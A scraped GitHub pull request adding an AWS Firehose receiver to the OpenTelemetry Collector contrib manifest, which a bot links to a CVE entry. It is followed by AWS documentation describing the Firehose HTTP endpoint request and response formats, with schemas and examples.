### @jefchien **[jefchien](/jefchien)** commented [Feb 18, 2022](#issue-1142120834)

[open-telemetry/opentelemetry-collector-contrib#7964](https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/7964)

**Link to Tracking Issue:** [open-telemetry/opentelemetry-collector-contrib#7571](https://github.com/open-telemetry/opentelemetry-collector-contrib/issues/7571)

Sorry, something went wrong.

All reactions

[![@jefchien](https://avatars.githubusercontent.com/u/84729962?s=40&v=4)](/jefchien)

`[Add AWS Firehose receiver to contrib manifest.](/open-telemetry/opentelemetry-collector-releases/pull/74/commits/d3cb3603e300cfe792542c227940ea995bf49352 "Add AWS Firehose receiver to contrib manifest.")`

`[d3cb360](/open-telemetry/opentelemetry-collector-releases/pull/74/commits/d3cb3603e300cfe792542c227940ea995bf49352)`

 [![@jefchien](https://avatars.githubusercontent.com/u/84729962?s=40&v=4)](/jefchien)
[jefchien](/jefchien)
requested review from
a team and
[tigrannajaryan](/tigrannajaryan)
[February 18, 2022 00:32](#event-6094590323)

[![jpkrohling](https://avatars.githubusercontent.com/u/13387?s=60&v=4)](/jpkrohling)

**[jpkrohling](/jpkrohling)**
approved these changes
[Feb 18, 2022](#pullrequestreview-887039595)

 [View reviewed changes](/open-telemetry/opentelemetry-collector-releases/pull/74/files/d3cb3603e300cfe792542c227940ea995bf49352)

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&v=4)](/Aneurysm9)

`[Merge branch 'main' into add-firehose-receiver](/open-telemetry/opentelemetry-collector-releases/pull/74/commits/63f4d8f3d3ad11871ab3a1ab4ca4af852e5720a6 "Merge branch 'main' into add-firehose-receiver")`

`[63f4d8f](/open-telemetry/opentelemetry-collector-releases/pull/74/commits/63f4d8f3d3ad11871ab3a1ab4ca4af852e5720a6)`

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=80&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

Copy link

Member

### **[Aneurysm9](/Aneurysm9)** commented [Apr 12, 2022](#issuecomment-1097305637)

| [@jpkrohling](https://github.com/jpkrohling) I fixed the conflict/build issue. Can we get this merged so the component can be included in the next release? |
| --- |

All reactions

Sorry, something went wrong.

[![jpkrohling](https://avatars.githubusercontent.com/u/13387?s=60&v=4)](/jpkrohling)

**[jpkrohling](/jpkrohling)**
approved these changes
[Apr 13, 2022](#pullrequestreview-941258465)

 [View reviewed changes](/open-telemetry/opentelemetry-collector-releases/pull/74/files/63f4d8f3d3ad11871ab3a1ab4ca4af852e5720a6)

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling)
[jpkrohling](/jpkrohling)
merged commit [`d0af718`](/open-telemetry/opentelemetry-collector-releases/commit/d0af718cc29f8ba268ab4bd5caf3a3b4eb5c0b62)
into
open-telemetry:main

[Apr 13, 2022](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74#event-6428832767)

[![@GoVulnBot](https://avatars.githubusercontent.com/u/96493708?s=40&v=4)](/GoVulnBot)
[GoVulnBot](/GoVulnBot)
mentioned this pull request
[Aug 28, 2024](#ref-issue-2493060138)

[x/vulndb: potential Go vuln in github.com/open-telemetry/opentelemetry-collector-contrib: CVE-2024-45043
golang/vulndb#3102](/golang/vulndb/issues/3102)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Fpull%2F74)

Reviewers

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling) [jpkrohling](/jpkrohling)

jpkrohling approved these changes

[![@tigrannajaryan](https://avatars.githubusercontent.com/u/4194920?s=40&v=4)](/tigrannajaryan) [tigrannajaryan](/tigrannajaryan)

 Awaiting requested review from tigrannajaryan

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@jefchien](https://avatars.githubusercontent.com/u/84729962?s=52&v=4)](/jefchien) [![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=52&v=4)](/Aneurysm9) [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=52&v=4)](/jpkrohling)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from docs.aws.amazon.com_481c453e_20250111_082351.html ===
Understand HTTP endpoint delivery request and response specifications - Amazon Data Firehose[AWS](https://aws.amazon.com)[Documentation](/index.html)[Amazon Data Firehose](/firehose/index.html)[Developer Guide](what-is-this-service.html)[Request format](#requestformat)[Response format](#responseformat)[Examples](#examples)
# Understand HTTP endpoint delivery request and response specifications

For Amazon Data Firehose to successfully deliver data to custom HTTP endpoints, these
endpoints must accept requests and send responses using certain Amazon Data Firehose
request and response formats. This section describes the format specifications of the HTTP
requests that the Amazon Data Firehose service sends to custom HTTP endpoints, as well as
the format specifications of the HTTP responses that the Amazon Data Firehose service
expects. HTTP endpoints have 3 minutes to respond to a request before Amazon Data Firehose
times out that request. Amazon Data Firehose treats responses that do not adhere to the
proper format as delivery failures.

## Request format

**Path and URL Parameters**

These are configured directly by you as part of a single URL field.
Amazon Data Firehose sends them as configured without modification. Only
https destinations are supported. URL restrictions are applied during
delivery-stream configuration.

###### Note

Currently, only port 443 is supported for HTTP endpoint data
delivery.

**HTTP Headers - X-Amz-Firehose-Protocol-Version**

This header is used to indicate the version of the request/response
formats. Currently the only version is 1.0.

**HTTP Headers - X-Amz-Firehose-Request-Id**

The value of this header is an opaque GUID that can be used for debugging
and deduplication purposes. Endpoint implementations should log the value of
this header if possible, for both successful and unsuccessful requests. The
request ID is kept the same between multiple attempts of the same
request.

**HTTP Headers - Content-Type**

The value of the Content-Type header is always
`application/json`.

**HTTP Headers - Content-Encoding**

A Firehose stream can be configured to use GZIP to
compress the body when sending requests. When this compression is enabled,
the value of the Content-Encoding header is set to gzip, as per standard
practice. If compression is not enabled, the Content-Encoding header is
absent altogether.

**HTTP Headers - Content-Length**

This is used in the standard way.

**HTTP Headers - X-Amz-Firehose-Source-Arn:**

The ARN of the Firehose stream represented in ASCII
string format. The ARN encodes region, AWS account ID and the stream name.
For example,
`arn:aws:firehose:us-east-1:123456789:deliverystream/testStream`.

**HTTP Headers - X-Amz-Firehose-Access-Key**

This header carries an API key or other credentials. You have the ability
to create or update the API-key (aka authorization token) when creating or
updating your delivery-stream. Amazon Data Firehose restricts the size of
the access key to 4096 bytes. Amazon Data Firehose does not attempt to
interpret this key in any way. The configured key is copied verbatim into
the value of this header.

The contents can be arbitrary and can potentially represent a JWT token or
an ACCESS\_KEY. If an endpoint requires multi-field credentials (for example,
username and password), the values of all of the fields should be stored
together within a single access-key in a format that the endpoint
understands (JSON or CSV). This field can be base-64 encoded if the original
contents are binary. Amazon Data Firehose does not modify and/or encode the configured
value and uses the contents as is.

**HTTP Headers - X-Amz-Firehose-Common-Attributes**

This header carries the common attributes (metadata) that pertain to the
entire request, and/or to all records within the request. These are
configured directly by you when creating a Firehose stream. The value of
this attribute is encoded as a JSON object with the following schema:

```

"$schema": http://json-schema.org/draft-07/schema#

properties:
  commonAttributes:
    type: object
    minProperties: 0
    maxProperties: 50
    patternProperties:
      "^.{1,256}$":
        type: string
        minLength: 0
        maxLength: 1024

```

Here's an example:

```

"commonAttributes": {
    "deployment -context": "pre-prod-gamma",
    "device-types": ""
  }

```

**Body - Max Size**

The maximum body size is configured by you, and can be up to a maximum of
64 MiB, before compression.

**Body - Schema**

The body carries a single JSON document with the following JSON Schema
(written in YAML):

```

"$schema": http://json-schema.org/draft-07/schema#

title: FirehoseCustomHttpsEndpointRequest
description: >
  The request body that the Firehose service sends to
  custom HTTPS endpoints.
type: object
properties:
  requestId:
    description: >
      Same as the value in the X-Amz-Firehose-Request-Id header,
      duplicated here for convenience.
    type: string
  timestamp:
    description: >
      The timestamp (milliseconds since epoch) at which the Firehose
      server generated this request.
    type: integer
  records:
    description: >
      The actual records of the Firehose stream, carrying
      the customer data.
    type: array
    minItems: 1
    maxItems: 10000
    items:
      type: object
      properties:
        data:
          description: >
            The data of this record, in Base64. Note that empty
            records are permitted in Firehose. The maximum allowed
            size of the data, before Base64 encoding, is 1024000
            bytes; the maximum length of this field is therefore
            1365336 chars.
          type: string
          minLength: 0
          maxLength: 1365336

required:
  - requestId
  - records

```

Here's an example:

```

{
  "requestId": "ed4acda5-034f-9f42-bba1-f29aea6d7d8f",
  "timestamp": 1578090901599
  "records": [
    {
      "data": "aGVsbG8="
    },
    {
      "data": "aGVsbG8gd29ybGQ="
    }
  ]
}

```

## Response format

**Default Behavior on Error**

If a response fails to conform to the requirements below, the Firehose server treats it as though it had a 500 status code with no
body.

**Status Code**

The HTTP status code MUST be in the 2XX, 4XX or 5XX range.

The Amazon Data Firehose server does NOT follow redirects (3XX status
codes). Only response code 200 is considered as a successful delivery of the
records to HTTP/EP. Response code 413 (size exceeded) is considered as a
permanent failure and the record batch is not sent to error bucket if
configured. All other response codes are considered as retriable errors and
are subjected to back-off retry algorithm explained later.

**Headers - Content Type**

The only acceptable content type is application/json.

**HTTP Headers - Content-Encoding**

Content-Encoding MUST NOT be used. The body MUST be uncompressed.

**HTTP Headers - Content-Length**

The Content-Length header MUST be present if the response has a
body.

**Body - Max Size**

The response body must be 1 MiB or less in size.

```

"$schema": http://json-schema.org/draft-07/schema#

title: FirehoseCustomHttpsEndpointResponse

description: >
  The response body that the Firehose service sends to
  custom HTTPS endpoints.
type: object
properties:
  requestId:
    description: >
      Must match the requestId in the request.
    type: string

  timestamp:
    description: >
      The timestamp (milliseconds since epoch) at which the
      server processed this request.
    type: integer

  errorMessage:
    description: >
      For failed requests, a message explaining the failure.
      If a request fails after exhausting all retries, the last
      Instance of the error message is copied to error output
      S3 bucket if configured.
    type: string
    minLength: 0
    maxLength: 8192
required:
  - requestId
  - timestamp

```

Here's an example:

```

Failure Case (HTTP Response Code 4xx or 5xx)
{
  "requestId": "ed4acda5-034f-9f42-bba1-f29aea6d7d8f",
  "timestamp": "1578090903599",
  "errorMessage": "Unable to deliver records due to unknown error."
}
Success case (HTTP Response Code 200)
{
  "requestId": "ed4acda5-034f-9f42-bba1-f29aea6d7d8f",
  "timestamp": 1578090903599
}

```

**Error Response Handling**

In all error cases the Amazon Data Firehose server reattempts delivery of the same
batch of records using an exponential back-off algorithm. The retries are
backed off using an initial back-off time (1 second) with a jitter factor of
(15%) and each subsequent retry is backed off using the formula
(initial-backoff-time \* (multiplier(2) ^ retry\_count)) with added jitter.
The backoff time is capped by a maximum interval of 2 minutes. For example
on the ânâ-th retry the back off time is = MAX(120, 2^n) \* random(0.85,
1.15).

The parameters specified in the previous equation are subject to change.
Refer to the AWS Firehose documentation for exact initial back off time, max
backoff time, multiplier and jitter percentages used in exponential back off
algorithm.

In each subsequent retry attempt the access key and/or destination to
which records are delivered might change based on updated configuration of
the Firehose stream. Amazon Data Firehose service uses the same request-id
across retries in a best-effort manner. This last feature can be used for
deduplication purpose by the HTTP end point server. If the request is still
not delivered after the maximum time allowed (based on Firehose stream
configuration) the batch of records can optionally be delivered to an error
bucket based on stream configuration.

## Examples

Example of a CWLog sourced request.

```

{
  "requestId": "ed4acda5-034f-9f42-bba1-f29aea6d7d8f",
  "timestamp": 1578090901599,
  "records": [
   {
    "data": {
      "messageType": "DATA_MESSAGE",
      "owner": "123456789012",
      "logGroup": "log_group_name",
      "logStream": "log_stream_name",
      "subscriptionFilters": [
        "subscription_filter_name"
      ],
      "logEvents": [
        {
          "id": "0123456789012345678901234567890123456789012345",
          "timestamp": 1510109208016,
          "message": "log message 1"
        },
        {
          "id": "0123456789012345678901234567890123456789012345",
          "timestamp": 1510109208017,
          "message": "log message 2"
        }
      ]
    }
   }
  ]
}

```

![Warning](https://d1ge0kk1l5kms0.cloudfront.net/images/G/01/webservices/console/warning.png) **Javascript is disabled or is unavailable in your browser.**

To use the Amazon Web Services Documentation, Javascript must be enabled. Please refer to your browser's Help pages for instructions.

[Document Conventions](/general/latest/gr/docconventions.html)Understand delivery across AWS accounts and regionsHandle data delivery failuresDid this page help you? - Yes

Thanks for letting us know we're doing a good job!

If you've got a moment, please tell us what we did right so we can do more of it.

Did this page help you? - No

Thanks for letting us know this page needs work. We're sorry we let you down.

If you've got a moment, please tell us how we can make the documentation better.


